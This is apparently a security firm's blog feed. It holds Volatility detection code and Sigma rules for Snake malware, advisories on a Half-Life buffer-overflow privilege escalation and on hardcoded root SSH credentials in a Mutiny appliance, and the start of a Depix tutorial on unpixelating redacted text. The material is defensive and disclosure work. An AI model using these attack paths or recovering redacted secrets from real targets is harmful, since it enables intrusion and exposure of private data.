        for proc in procs:
            process_name = utility.array_to_string(proc.ImageFileName)
            for vad, data in self.list_injections(self.context, 
            kernel.layer_name, kernel.symbol_table_name, proc):
                strings_to_find = [b&amp;#39;\x25\x73\x23\x31&amp;#39;,b&amp;#39;\x25\x73\x23\x32&amp;#39;,
                b&amp;#39;\x25\x73\x23\x33&amp;#39;,b&amp;#39;\x25\x73\x23\x34&amp;#39;, 
                b&amp;#39;\x2e\x74\x6d\x70&amp;#39;, b&amp;#39;\x2e\x73\x61\x76&amp;#39;,
                b&amp;#39;\x2e\x75\x70\x64&amp;#39;]
                if not all(stringToFind in data for 
                stringToFind in strings_to_find):
                    continue
                yield (0, (proc.UniqueProcessId, process_name, 
                format_hints.Hex(vad.get_start()),
                           format_hints.Hex(vad.get_size()),
                           vad.get_protection(
                               vadinfo.VadInfo.protect_values(self.context, 
                kernel.layer_name, kernel.symbol_table_name), 
                vadinfo.winnt_protections)))
                return

    def run(self):
        kernel = self.context.modules[self.config[&amp;#39;kernel&amp;#39;]]
        return renderers.TreeGrid([(&amp;#34;PID&amp;#34;, int), (&amp;#34;Process&amp;#34;, str), 
        (&amp;#34;Address&amp;#34;, format_hints.Hex), (&amp;#34;Length&amp;#34;, format_hints.Hex), 
        (&amp;#34;Protection&amp;#34;, str)], self._generator(pslist.PsList.list_processes(
        context = self.context, layer_name = kernel.layer_name,  
        symbol_table = kernel.symbol_table_name)))&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Security researchers are currently developing detections and rules to speed up the memory analysis process. For example, Matt Suiche, Director of Incident Response R&amp;amp;D at Magnet Forensics (MAGT:TO), has recently developed a &lt;a href=&#34;https://gist.github.com/msuiche/8c8fd278430dda0292b4cfdfc549ca2d&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;YARA rule&lt;/a&gt; based on the above Volatility plugin to look into memory and identify snake.&lt;/p&gt;
&lt;h2&gt;Other Detection Mechanisms and Sigma Rules&lt;span class=&#34;absolute -mt-20&#34; id=&#34;other-detection-mechanisms-and-sigma-rules&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#other-detection-mechanisms-and-sigma-rules&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Researchers at the open-source project SigmaHQ have also started developed rules that will help hunt for the malware and detect when it performs malicious operations in the network which can be found &lt;a href=&#34;https://github.com/SigmaHQ/sigma/pull/4231/files&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As of now, the rules currently developed include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Kernel Driver File Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Malware Installer Name Indicators&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Malware WerFault Persistence File Creation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential SNAKE Malware Installation CLI Arguments Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Installation Binary Indicator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential SNAKE Malware Persistence Service Execution&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Covert Store Registry Key&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Potential Encrypted Registry Blob Related To SNAKE Malware&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SNAKE Malware Service Persistence&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Should a different set of rules be needed for your specific EDR or SOC/SIEM it is possible to utilise the extremely helpful open-source resource &lt;a href=&#34;https://uncoder.io/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Uncoder&lt;/a&gt; to convert rules.&lt;/p&gt;
&lt;h1&gt;Long-term prevention&lt;/h1&gt;&lt;p&gt;If you believe your organisation is at risk, JUMPSEC recommends building an Incident Response Plan and a dedicated team to monitor and effectively respond to the threats posed by Snake, in order to meaningfully utilise and validate the detection techniques outlined above.&lt;/p&gt;
&lt;p&gt;To ensure that implemented detections are effective JUMPSEC recommends:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Using Atomic Red Team and Purple Team approaches to ingest and execute techniques used by Snake in your network to identify gaps in detection capabilities. For Purple Team Testing, security researchers at Red Canary have already started developing open-source Atomic Red Team test cases to simulate Snake which can be found &lt;a href=&#34;https://github.com/redcanaryco/atomic-red-team/pull/2418&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Actively hunting for Snake malware using endpoint and network detection tooling. Third party security providers such as JUMPSEC can assist with deployment and integration with existing detection and response platforms to monitor and prioritise critical instances of malicious activity.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Deploying Canary Tokens in your estate where possible. Canary Tokens can serve as early warning systems as part of your organisations broader security strategy.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ensuring you have an adequate incident response plan that is ready to deploy. This may include baselining or reviewing existing response processes and procedures. In the event that a Snake is identified, incident response plans can be triggered, affected hosts quarantined, back-up systems deployed, and any other steps deemed necessary to secure the environment can be taken.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additionally, Snake typically achieves network intrusion by exploiting vulnerable, publicly available infrastructure via targeted phishing and social engineering campaigns, meaning that organisations should rigorously review potential vulnerabilities in externally facing assets.&lt;/p&gt;
&lt;h2&gt;MFA and credential management&lt;span class=&#34;absolute -mt-20&#34; id=&#34;mfa-and-credential-management&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#mfa-and-credential-management&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As an FSB espionage tool gathering credentials for up to 20 years, JUMPSEC would additionally echo that organisations who have not already embedded standard best practice when it comes to MFA and credential management should implement appropriate measures. For example:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Change account credentials to values which cannot be brute forced or guessed based on old passwords, requiring minimum password strengths and unique credentials for every account.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use appropriate role separation, account permissions and separate user and privileged accounts.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Implement phishing-resistant MFA or go passwordless if possible (Biometrics and FIDO2 keys).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Deploy digitally signed Security.txt files to all public facing web domains which conform to the recommendations in RFC 9118.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As a final note, JUMPSEC recommend reporting any Indicators of Compromise (IoCs) to the relevant authorities (NCSC for UK based organisations), as well as the wider security community where appropriate.&lt;/p&gt;
&lt;h2&gt;Helpful Links&lt;span class=&#34;absolute -mt-20&#34; id=&#34;helpful-links&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#helpful-links&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;CISA Advisory - &lt;a href=&#34;https://www.cisa.gov/sites/default/files/2023-05/aa23-129a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.cisa.gov/sites/default/files/2023-05/aa23-129a&lt;/a&gt;_snake_malware_1.pdf&lt;/li&gt;
&lt;li&gt;RFC 9118 - &lt;a href=&#34;https://datatracker.ietf.org/doc/rfc9118/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://datatracker.ietf.org/doc/rfc9118/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Canary Tokens - &lt;a href=&#34;https://canarytokens.org/generate&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://canarytokens.org/generate&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Guide to setup security.exe - &lt;a href=&#34;https://securitytxt.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://securitytxt.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Mitre - &lt;a href=&#34;https://attack.mitre.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://attack.mitre.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;SigmaHQ rules - &lt;a href=&#34;https://github.com/SigmaHQ/sigma&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/SigmaHQ/sigma&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2023-30382 – Half-Life Local Privilege Escalation&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2023/05/2023-05-23-advisory-cve-2023-30382-half-life-local-privilege-escalation/</link>
      <pubDate>Tue, 23 May 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/05/2023-05-23-advisory-cve-2023-30382-half-life-local-privilege-escalation/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; Half-Life&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; Latest (&amp;lt;= build 5433873), at the time of writing&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.valvesoftware.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.valvesoftware.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2023-30382&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 23/05/2023&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.1 Score:&lt;/strong&gt; 8.2 AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Local&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Ryan Saridar&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An attacker can leverage a stack-based buffer overflow via Half-Life’s command line arguments to compromise the account of any local user who launches the game.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;hl.exe does not adequately perform bounds checking on the command line used to launch it, allowing an attacker with control of the launch parameters to gain code execution as the user running it. By default, all users can access the C:\Program Files (x86)\Steam\userdata\&lt;steamID3&gt;\config\localconfig.vdf file, which can be modified to enforce a Steam application to launch with any provided command line parameters. Combining these, a low-privileged attacker can set specially crafted launch parameters using this file, and therefore gain privilege escalation when a higher privileged user runs the application.&lt;/p&gt;
&lt;p&gt;The cause of the buffer overflow is found in the CCommandLine::CreateCmdLine and CCommandLine::LoadParametersFromFile functions. CreateCmdLine allocates a 4096 byte buffer which LoadParametersFromFile copies the command line to. Given that the command line is not restricted to 4096 bytes, this can lead to an overflow. This appears to have been fixed in games such as HL2 and TF2, however the fix was not applied to the original HL.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Valve has not responded to previous submissions of this issue, meaning the game is not patched. The simplest and most effective method of mitigation at this time is the uninstallation of Half-Life.&lt;/p&gt;
&lt;p&gt;That said, there is another way of mitigating this route of attack if this isn’t an option, though it does not address the underlying buffer overflow vulnerability and thus will not cover possible alternate routes of exploitation. Your Steam installation contains globally writable configuration files that store each Steam user’s saved command line arguments (C:\Program Files (x86)\Steam\userdata\&lt;steamID3&gt;\config\localconfig.vdf). If a Steam user account is predominantly used by a specific local user, you can restrict writability of this file to that user account, preventing another user from being able to overwrite your command line arguments. You could also check the command line parameters via the Steam GUI before launching the game to ensure it is as expected.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;09/01/2021: Buffer overflow submitted for bug bounty, though rejected due to social engineering requirement&lt;/p&gt;
&lt;p&gt;11/01/2021: Attempt to disclose via Valve’s public security email, with no response received&lt;/p&gt;
&lt;p&gt;09/02/2021: Subsequent attempt to disclose, again with no response&lt;/p&gt;
&lt;p&gt;28/08/2022: Revisited the vulnerability and discovered the local privilege escalation route via the configuration file&lt;/p&gt;
&lt;p&gt;29/08/2022: Subsequent bug bounty submission, which was rejected due to claims that a remote code execution exploit of this vulnerability had been discovered and disclosed since&lt;/p&gt;
&lt;p&gt;04/04/2023: CVE requested and plan to publish due to lack of remediation, despite awareness of the issue&lt;/p&gt;
&lt;p&gt;26/04/2023: CVE assigned by MITRE&lt;/p&gt;
&lt;p&gt;23/05/2023: Publication by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2022-37832 - Mutiny Network Monitoring Appliance hardcoded credentials&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2022/12/2022-12-15-advisory-cve-2022-37832-mutiny-network-monitoring-appliance-hardcoded-credentials/</link>
      <pubDate>Thu, 15 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/12/2022-12-15-advisory-cve-2022-37832-mutiny-network-monitoring-appliance-hardcoded-credentials/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; Mutiny Network Monitoring Appliance&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; &amp;lt;= 7.2.0-10855&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.mutiny.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.mutiny.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2022-37832&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 16/12/2022&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.1 Score:&lt;/strong&gt; 10.0 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Ryan Saridar&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An attacker can log in as root remotely to the appliance via SSH.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Upgrade to version 7.2.0-10855 onwards to remediate the problem.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Before version 7.2.0-10855, the SSH service allows password login to the appliance. The use of weak, hardcoded root credentials between versions means that an attacker with knowledge of this fixed password can log into the appliance remotely and gain unrestricted access to it. Between version 7.2.0-10788 and up to 7.2.0-10850, key-based authentication was introduced, however password-based authentication was not yet disabled. On the patched version, key-based authentication is enforced.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;05/08/2022: Issue reported to the vendor&lt;/p&gt;
&lt;p&gt;05/08/2022: Vendor acknowledged the issues&lt;/p&gt;
&lt;p&gt;19/08/2022: Vendor fixed the issue&lt;/p&gt;
&lt;p&gt;12/09/2022: CVE number assigned from MITRE&lt;/p&gt;
&lt;p&gt;16/12/2022: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Can Depix deobfuscate your data?</title>
      <link>//localhost:1313/articles/2021/08/2021-08-03-can-depix-deobfuscate-your-data/</link>
      <pubDate>Tue, 03 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/08/2021-08-03-can-depix-deobfuscate-your-data/</guid>
      <description>
        
        
        &lt;h2&gt;&lt;strong&gt;&lt;em&gt;The censored text cracking tool&lt;/em&gt;&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-censored-text-cracking-tool&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-censored-text-cracking-tool&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;By Caleb Herbert&lt;/p&gt;
&lt;p&gt;In this post, Caleb explores &lt;strong&gt;Depix&lt;/strong&gt; and its potential to recover sensitive text from reports that were redacted by the original authors. You can use our guidance to enter the challenge and test your GPU’s mettle against the gauntlet we’ve thrown down!&lt;/p&gt;
&lt;h1&gt;&lt;strong&gt;1. What is Depix and how is it used?&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;When sensitive information is about to be displayed to a reader, an author may &lt;strong&gt;blur the sensitive text&lt;/strong&gt; so it can no longer be recognised. &lt;strong&gt;Blurring&lt;/strong&gt; is intended to be used to redact text &lt;strong&gt;FOREVER&lt;/strong&gt;… but I think that isn’t true anymore. We have some tooling that can unblur that text, and uncover quite interesting things that the original authors would have rather we didn&amp;rsquo;t know.&lt;/p&gt;
&lt;p&gt;This &lt;a href=&#34;https://twitter.com/nieldk/status/1416659174759469057?s=20&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;fascinating Twitter exchange&lt;/a&gt; offers the perfect example of how the &lt;strong&gt;Depix&lt;/strong&gt; tool could be deployed to steal redacted, sensitive credit card information?!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;images/2021-07-30_10-13.png&#34; alt=&#34;2021 07 30 10 13&#34; loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;images/2021-07-30_15-55-1.png&#34; alt=&#34;2021 07 30 15 55 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;strong&gt;2.What is Depix and what can it do?&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/beurtschipper/Depix&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Depix is a Python program&lt;/a&gt; designed to recover censored text to a readable format via a simple command. &lt;em&gt;Sounds too good to be true right?&lt;/em&gt; In this post, we’ll be evaluating how effective Depix is at defeating obfuscation.&lt;/p&gt;
&lt;p&gt;The Depix tool assumes that all text positioning of all characters is done at pixel level. Pixelation is an author’s attempt to redact and obfuscate specific chunks of text they consider to be sensitive. For example, a test report may pixelate and blur a user’s password that the tester had been able to recover. As a high-level overview, leveraging pixelation-as-redaction lowers the resolution and quality of an image to undermine its readability.&lt;/p&gt;
&lt;p&gt;A big caveat to Depix’s use-case is that it &lt;strong&gt;relies on the redaction tool operating in a specific way&lt;/strong&gt;: the text must have been pixelated with a linear box filter, since it processes every block separately. What this means is that the tool takes a quadrant of the pixels and overwrites them based on specific averages of those collected pixels. If you have obfuscated your sensitive text by using a &lt;strong&gt;nice thick, opaque box&lt;/strong&gt; then you don’t have anything to worry about….but if you used pixelation as obfuscation, then &lt;strong&gt;you may have 99 problems and de-obfuscation is one&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-28_10-24-edited.png&#34; alt=&#34;2021 07 28 10 24&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;2.1 Reversing pixelation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;21-reversing-pixelation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#21-reversing-pixelation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Given that the &lt;em&gt;algorithm&lt;/em&gt; that Depix un-pixelates the text follows a specific ‘recipe’, it may not always be effective.&lt;/p&gt;
&lt;p&gt;Depix deploys almost a &lt;strong&gt;brute force&lt;/strong&gt; method to recover the original text. It takes all printable characters and then begins to pixelate these characters in different combinations. This brute force is compared with the original, blurred text and continues until the same pixelated, numeric value can be replicated.&lt;/p&gt;
&lt;h2&gt;2.2 Why is there a concern? &lt;span class=&#34;absolute -mt-20&#34; id=&#34;22-why-is-there-a-concern&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#22-why-is-there-a-concern&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Depix &lt;strong&gt;&lt;em&gt;could&lt;/em&gt;&lt;/strong&gt; have a serious impact on the existing archive of documents and videos that exist across the internet.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-27_17-40.png&#34; alt=&#34;2021 07 27 17 40&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The possibility of this tool means any files which have been redacted and publicly disclosed, or YouTube videos which have passwords/texts or IPs redacted can be recovered and stolen. If malicious actors, organisation competitors, or even script kiddies got their hands on this, the censored private information would be at serious risk. &lt;/p&gt;
&lt;p&gt;They would only need to screenshot/download the files or images and run Depix against it. Granted, they’d have to have used a specific set of tools to censor the text but if so, the risk remains. &lt;/p&gt;
&lt;h1&gt;&lt;strong&gt;3. Depix in action&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;We’ve teased you enough, let’s see this tool in action!&lt;/p&gt;
&lt;p&gt;We’re going to do this twice. The &lt;strong&gt;first time&lt;/strong&gt; we’ll be using the author’s practice example, to ensure the tooling works as expected. The &lt;strong&gt;second time&lt;/strong&gt; we’ll conjure up our own redacted, pixelated image and see how well the tooling still recovers the original text. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;3.1 Setup Depix&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;31-setup-depix&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#31-setup-depix&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Go to the &lt;a href=&#34;https://github.com/beurtschipper/Depix&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github repo for Depix&lt;/a&gt;, and download the .ZIP that contains all of the tooling. Extract the .ZIP in a directory you are happy with.&lt;/p&gt;
&lt;p&gt;You’ll want to traverse to two directories down (/Depix-main/Depix-main) and then install the requirements that Depix requires to work&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pngbase646f4446a5516dec7d.png&#34; alt=&#34;pngbase646f4446a5516dec7d&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;3.2 Test images&lt;span class=&#34;absolute -mt-20&#34; id=&#34;32-test-images&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#32-test-images&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are two important directories we’ll need for this experiment: /&lt;strong&gt;testimages/&lt;/strong&gt; and /&lt;strong&gt;searchimages&lt;/strong&gt;/ &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The test image directory includes censored text which you can practice recovering. &lt;/li&gt;
&lt;li&gt;The search image directory includes images which are used like a dictionary to recover pixelated text. The image includes all upper- and lower-case alphanumeric letters with and without spaces for testing purposes. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed.png&#34; alt=&#34;unnamed&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Close up, the above image looks like this - a collection of printable characters. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-30_16-00.png&#34; alt=&#34;2021 07 30 16 00&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h3&gt;3.2.1 De Bruijn sequence &lt;span class=&#34;absolute -mt-20&#34; id=&#34;321-de-bruijn-sequence&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#321-de-bruijn-sequence&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Interestingly, the above image can actually be re-created fresh on your own local machine. You don’t have to do this, as a sequence is already provided for you. However, it is interesting to see how it is produced.&lt;/p&gt;
&lt;p&gt;In the ether of the internet, there is this orphaned &lt;a href=&#34;https://gist.github.com/rgov/891712#file-debruijn-py-L16&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;script&lt;/a&gt; that will produce the sequence of printable characters necessary to also use &lt;strong&gt;Depix.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-1.png&#34; alt=&#34;unnamed 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2021-07-27_14-56.png&#34; alt=&#34;2021 07 27 14 56&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;3.3 Test recovery&lt;span class=&#34;absolute -mt-20&#34; id=&#34;33-test-recovery&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#33-test-recovery&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To recover redacted text there are specific methods, depending on the tools that obfuscated the original text. This is a &lt;strong&gt;significant limitation&lt;/strong&gt; that the original author recognises, however we’ll put that aside for now and come back to it later. &lt;/p&gt;
&lt;p&gt;If &lt;strong&gt;Notepad&lt;/strong&gt; is used and pixelated with &lt;strong&gt;Greenshot&lt;/strong&gt; we need the following command: &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;depix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testimage3_pixels&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;searchimages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debruinseq_notepad_Windows10_closeAndSpaced&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;images&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;png&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
